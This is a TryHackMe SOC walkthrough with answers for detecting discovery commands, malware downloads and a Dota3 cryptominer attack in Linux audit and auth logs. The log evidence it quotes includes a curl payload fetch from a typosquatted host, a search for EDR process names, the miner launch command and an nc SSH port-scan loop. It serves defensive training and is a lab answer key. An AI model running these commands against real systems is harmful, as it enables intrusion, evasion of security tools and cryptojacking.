---
title: Linux Threat Detection 2 Walkthrough
description: Identify discovery commands, malware uploads, and cryptomining attacks in Linux logs.
pubDate: 2026-11-03
categories:
  - SOC
  - Walkthrough
  - TryHackMe
  - Network
tags:
  - Lessons
image: /image/networksecess.png
---
---
## Summary

In this room, I practiced identifying post-compromise Discovery commands, Ingress Tool Transfer downloads, and a real-world Dota3 cryptominer attack on Linux. First, I tested local discovery commands like `systemd-detect-virt` (`amazon`) and `ps aux` to spot a running antimalware process (`/var/lib/ultrasec/malscan`). Next, I used `ausearch` to investigate automated discovery commands in `auditd` logs and traced them back to a legitimate IT troubleshooting script (`/home/itsupport/debug.sh` written by `greg@tryhackme.thm`). After comparing a legitimate `wget` download (`artifacts.elastic.co`) against a suspicious `curl` download (`http://drobbox-online.thm/helper.sh` saved to `/var/tmp/helper.sh`), I investigated the Dota3 incident in `/home/ubuntu/scenario/`. By correlating `auth.log` and `audit.log`, I found the SSH brute-force IP (`45.9.148.125`), the attacker's enumeration commands (`last` and `egrep` checking for `ds_agent, falcon, sentinel`), the SCP-transferred miner archive (`kernupd.tar.gz`), the miner execution command (`nohup /tmp/.apt/kernupd/kernupd`), and the internal SSH port scan across `10.10.12.1-10.10.12.10`.

---

**Learning Objectives**

- Explore how to identify Discovery commands in logs
- Learn common threats endangering Linux servers
- Know how attackers upload malware onto their victims
- Practice your skills by uncovering a real cryptominer attack

---
## Task 1.1
Run `systemd-detect-virt` to detect the system's cloud. What is the command's output you discovered?

**Answer**: `amazon`

**Why?**
Running `systemd-detect-virt` in the terminal checks the hypervisor and virtualization environment of the host and outputs `amazon`.

![](../../assets/Pasted%20image%2020261109180227.png)

## Task 1.2
Now run `ps aux` and look for EDR or antivirus processes. What is the full path to the detected antimalware binary?

**Answer**: `/var/lib/ultrasec/malscan`

**Why?**
Running `ps aux | grep -iE "scan"` lists the running processes matching `scan` and reveals `/bin/bash /var/lib/ultrasec/malscan` running as `root` (`PID 626`).

![](../../assets/Pasted%20image%2020261109180718.png)

## Task 2.1
What is the path of the script that initiated the "hostname" command?

**Answer**: `/home/itsupport/debug.sh`

**Why?**
Searching `auditd` for `hostname` with `ausearch -i -x hostname` shows `ppid=3771` running from `cwd=/home/itsupport`. Querying `--pid 3771` shows `proctitle=bash debug.sh` inside `cwd=/home/itsupport`, giving the full path `/home/itsupport/debug.sh`.

![](../../assets/Pasted%20image%2020261109182837.png)

## Task 2.2
What was the last Discovery command launched by the script?

**Answer**: `ps -eo pid,ppid,cmd,%mem,%cpu --sort=-%cpu`

**Why?**
Running `ausearch -i --ppid 3771` lists all child processes spawned by `debug.sh` in chronological order. The last discovery command executed right before `head -n 10` is `ps -eo pid,ppid,cmd,%mem,%cpu --sort=-%cpu`.

![](../../assets/Pasted%20image%2020261109183045.png)

![](../../assets/Pasted%20image%2020261109183030.png)

## Task 2.3
Looking at the script content, what's the email of the script author?

**Answer**: `greg@tryhackme.thm`

**Why?**
Navigating to `/home/itsupport/` and reading `debug.sh` (`cat debug.sh`) shows the comment at the top: `# Please contact the author, greg@tryhackme.thm`.

![](../../assets/Pasted%20image%2020261109183147.png)

## Task 3.1
From which domain was the Elastic agent downloaded?

**Answer**: `artifacts.elastic.co`

**Why?**
Querying `auditd` for `wget` executions with `ausearch -i -x wget` shows `proctitle=wget https://artifacts.elastic.co/downloads/beats/elastic-agent/elastic-agent-9.1.3-linux-x86_64.tar.gz`, so the domain is `artifacts.elastic.co`.

![](../../assets/Pasted%20image%2020261109235109.png)

## Task 3.2
What is the full path to the downloaded "helper.sh" script?

**Answer**: `/var/tmp/helper.sh`

**Why?**
Querying `auditd` for `curl` executions with `ausearch -i -x curl` shows `proctitle=curl http://drobbox-online.thm/helper.sh -o /var/tmp/helper.sh`, which saved the script to `/var/tmp/helper.sh`.

![](../../assets/Pasted%20image%2020261109235200.png)

## Task 3.3
Which of the downloaded files is more likely to be malicious: The one downloaded with `curl` or `wget`?

**Answer**: `curl`

**Why?**
Comparing `curl` vs `wget`, the `wget` command downloaded an official Elastic Agent package over HTTPS (`artifacts.elastic.co`), whereas the `curl` command downloaded a shell script (`helper.sh`) over plain HTTP from a typosquatted domain (`drobbox-online.thm`) directly into `/var/tmp/`, making `curl` the malicious one.

## Task 4.1
Which IP address managed to brute-force the exposed SSH?

**Answer**: `45.9.148.125`

**Why?**
Navigating to `/home/ubuntu/scenario` and filtering `auth.log` for successful logins (`cat auth.log | grep -iE "Accepted"`) shows `Accepted password for root from 45.9.148.125` right after the SSH brute-force attack.

![](../../assets/Pasted%20image%2020261110001129.png)

## Task 4.2
Which command did the attacker use to list the last logged-in users?

**Answer**: `last`

**Why?**
Inspecting the `audit.log` events in `/home/ubuntu/scenario` right after the attacker's SSH login (`ses=39`) shows the attacker running `id` followed immediately by `comm="last" exe="/usr/bin/last"` (`last`).

![](../../assets/Pasted%20image%2020261110002020.png)

## Task 4.3
Which three EDR processes did the attacker look for with `egrep`? (Format: proc1, proc2, proc3 in alphabetical order)

**Answer**: `ds_agent, falcon, sentinel`

**Why?**
Filtering `audit.log` for `egrep` (`cat audit.log | grep -iE "egrep"`) reveals `type=EXECVE ... a0="/bin/sh" a1="/usr/bin/egrep" a2="--color=auto" a3="falcon|sentinel|ds_agent"`. Put in alphabetical order, the three EDR processes are `ds_agent, falcon, sentinel`.

![](../../assets/Pasted%20image%2020261110002238.png)

## Task 5.1
What is the name of the malicious archive that was transferred via SCP?

**Answer**: `kernupd.tar.gz`

**Why?**
We can review the `proctitle=` lines in `/home/ubuntu/scenario/audit.log` (`ausearch -i -if audit.log | grep proctitle=`) or search directly for `.tar.gz` archives (`cat audit.log | grep -iE ".tar.gz"`). Both show the attacker extracting `kernupd.tar.gz` into `/tmp/.apt` (`tar xzf kernupd.tar.gz -C /tmp/.apt`).

![](../../assets/Pasted%20image%2020261110004449.png)
OR
![](../../assets/Pasted%20image%2020261110004633.png)

![](../../assets/Pasted%20image%2020261110004612.png)

![](../../assets/Pasted%20image%2020261110004857.png)

## Task 5.2
What was the full command line used to launch the cryptominer?

**Answer**: `nohup /tmp/.apt/kernupd/kernupd`

**Why?**
Searching the scenario `audit.log` for `kernupd` (`ausearch -i -if audit.log | grep kernupd`) shows that after extracting the archive and running `chmod +x /tmp/.apt/kernupd/kernupd`, the attacker launched the miner in the background using `proctitle=nohup /tmp/.apt/kernupd/kernupd`.

![](../../assets/Pasted%20image%2020261110004612.png)

## Task 5.3
Which IP address range did the attacker scan for an exposed SSH? (Format: IP1-IP2)

**Answer**: `10.10.12.1-10.10.12.10`

**Why?**
Checking the `proctitle` entries in `/home/ubuntu/scenario/audit.log` shows a bash loop scanning port `22` with `nc`: `nohup bash -c for ip in 10.10.12.{1..10}; do nc -zvw1 $ip 22 2>&1 | grep succeeded; done`, which scans the range `10.10.12.1-10.10.12.10`.

![](../../assets/Pasted%20image%2020261110005320.png)
![](../../assets/Pasted%20image%2020261110005301.png)

